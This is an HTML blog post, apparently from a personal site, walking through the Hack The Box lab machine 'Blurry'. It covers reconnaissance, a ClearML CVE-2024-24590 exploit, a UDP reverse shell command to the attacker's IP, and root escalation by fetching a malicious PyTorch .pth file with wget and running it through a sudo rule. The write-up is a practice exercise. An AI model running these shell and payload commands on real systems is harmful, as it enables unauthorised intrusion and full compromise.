@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Blurry - abno</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Blurry</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1723542332288"
+                  >2024-08-13 11:45</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1724833004675"
+                  >2024-08-28 10:16</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">recon</h1>
+<div><pre class="hljs"><code><span class="hljs-meta">$</span><span class="language-bash">nmap -A 10.10.11.19</span>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-13 09:43 UTC
+Nmap scan report for 10.10.11.19
+Host is up (0.051s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
+|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
+|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
+80/tcp open  http    nginx 1.18.0
+|_http-title: Did not follow redirect to http://app.blurry.htb/
+|_http-server-header: nginx/1.18.0
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+<div><pre class="hljs"><code><span class="hljs-meta">$</span><span class="language-bash">ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://FUZZ.blurry.htb -<span class="hljs-built_in">fc</span> 301 -t 200</span>
+
+files                   [Status: 200, Size: 2, Words: 1, Lines: 1, Duration: 83ms]
+app                     [Status: 200, Size: 13327, Words: 382, Lines: 29, Duration: 77ms]
+chat                    [Status: 200, Size: 218733, Words: 12692, Lines: 449, Duration: 94ms]
+:: Progress: [19966/19966] :: Job [1/1] :: 179 req/sec :: Duration: [0:00:39] :: Errors: 2 ::</code></pre></div>
+<p><img src="/_resources/75e5aecf79ac4bb593a4825c77d68192.png" /></p>
+<h1 id="chata">chata</h1>
+<p><img src="/_resources/53117c8aa77d4536b93af2897e54f310.png" /></p>
+<p>jippity is admin.</p>
+<h1 id="cve-2024-24590-clearml">CVE-2024-24590-ClearML</h1>
+<p>Nist database with describtion of CVE:<br />
+<a title="https://nvd.nist.gov/vuln/detail/CVE-2024-24590" href="https://nvd.nist.gov/vuln/detail/CVE-2024-24590">https://nvd.nist.gov/vuln/detail/CVE-2024-24590</a></p>
+<p>Explanation:<br />
+<a title="https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/" href="https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/">https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/</a></p>
+<p>Ready script:<br />
+<a title="https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit" href="https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit">https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit</a></p>
+<p><img src="/_resources/5e2638ba1dd8489181aec5663983ddf0.png" /></p>
+<p>Now we get access to the account of jippity, admin of previous chat.<br />
+Thus, we have user flag.</p>
+<h1 id="establishing-shell">Establishing shell</h1>
+<p>To escape this buggy machine:</p>
+<div><pre class="hljs"><code><span class="hljs-meta"># </span><span class="language-bash">Listener:</span>
+nc -u -lvp 4242
+<span class="hljs-meta">
+# </span><span class="language-bash">Victim:</span>
+sh -i &gt;&amp; /dev/udp/10.10.14.81/4242 0&gt;&amp;1
+<span class="hljs-meta">
+
+# </span><span class="language-bash">and <span class="hljs-keyword">then</span></span>
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+CTRL-Z
+stty raw -echo; fg</code></pre></div>
+<h1 id="priv-esc">Priv Esc</h1>
+<p>Running LinEnum gives us:</p>
+<div><pre class="hljs"><code>[+] We can sudo without supplying a password!
+Matching Defaults entries <span class="hljs-keyword">for</span> jippity on <span class="hljs-symbol">blurry:</span>
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>
+
+User jippity may run the following commands on <span class="hljs-symbol">blurry:</span>
+    (root) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/evaluate_model /models/*.pth
+[+] We can sudo without supplying a password!
+Matching Defaults entries <span class="hljs-keyword">for</span> jippity on <span class="hljs-symbol">blurry:</span>
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>
+
+User jippity may run the following commands on <span class="hljs-symbol">blurry:</span>
+    (root) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/evaluate_model /models/*.pth</code></pre></div>
+<p>evaluate_model is a python script running those models and based on their output it gives them a score. It becomes obvious that we need to create a malicious .pth file and run it with this script. Fortunetly for us, someone created already a script generating .pth files running arbitrary commands.</p>
+<p><a title="https://github.com/duck-sec/pytorch-evil-pth" href="https://github.com/duck-sec/pytorch-evil-pth">https://github.com/duck-sec/pytorch-evil-pth</a></p>
+<div><pre class="hljs"><code><span class="hljs-meta"># </span><span class="language-bash">on host</span> 
+./evil_pth.py 'cat /root/root.txt &gt;&gt; /models/flag'
+http-server
+<span class="hljs-meta">
+# </span><span class="language-bash">on victim</span>
+wget http://10.10.14.81:8080/evil_model.pth
+sudo /usr/bin/evaluate_model /models/evil_model.pth
+cat /models/flag</code></pre></div>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
